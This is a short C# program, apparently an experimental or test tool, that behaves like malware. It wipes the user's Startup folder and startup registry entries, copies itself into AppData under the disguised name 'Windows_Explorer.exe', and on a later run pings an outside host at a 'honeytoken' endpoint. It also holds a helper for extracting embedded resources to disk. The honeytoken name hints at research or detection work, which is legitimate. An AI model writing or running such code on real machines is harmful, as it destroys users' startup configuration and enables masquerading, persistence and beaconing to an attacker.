using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Reflection;
using System.Net.NetworkInformation;
using System.Net.Http;

namespace Test
{
    internal class Program
    {
        static void removefolder()
        {
            string Path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            Console.WriteLine(Path);
            System.IO.DirectoryInfo di = new DirectoryInfo(Path);

            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
        }
        static void Main(string[] args)
        {
           
            var ExploitFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Explorer.exe";
            if (!File.Exists(ExploitFile))
            {
                /////////////////

                removefolder();
                ManagementClass cls = new ManagementClass("Win32_StartupCommand");
                ManagementObjectCollection coll = cls.GetInstances();

                foreach (ManagementObject obj in coll)
                {
                    string name = (obj["Name"].ToString());
                    string loc = obj["Location"].ToString();

                    Console.WriteLine(name);
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        key.DeleteValue(name, false);
                    }
                }
                Console.WriteLine("\n\n-----------------------------After operation.....\nThis remains (Deafult windows)\n");
                /////////////////////////////////////////////////////////////////////


                string thisFile = System.AppDomain.CurrentDomain.FriendlyName;

                string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
                File.Copy(Path, ExploitFile);
            }
            else
            {
                Console.WriteLine("Here");
                HttpClient client = new HttpClient();
                /*client.BaseAddress = new Uri("http://192.168.100.156:5000/");*/

                var res = client.GetAsync("http://192.168.100.156:5000/api/honeytoken/ping/1").Result;
                
                Console.WriteLine(res);
                File.Delete(ExploitFile);

            }



            //run our exe on startup



            /*extractResource("")*/
        }
        public static void extractResource(String embeddedFileName, String destinationPath)
        {
            var currentAssembly = Assembly.GetExecutingAssembly();
            var arrResources = currentAssembly.GetManifestResourceNames();
            foreach (var resourceName in arrResources)
            {
                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
                {
                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
                    {
                        using (var output = File.OpenWrite(destinationPath))
                            resourceToSave.CopyTo(output);
                        resourceToSave.Close();
                    }
                }
            }
        }
    }
}
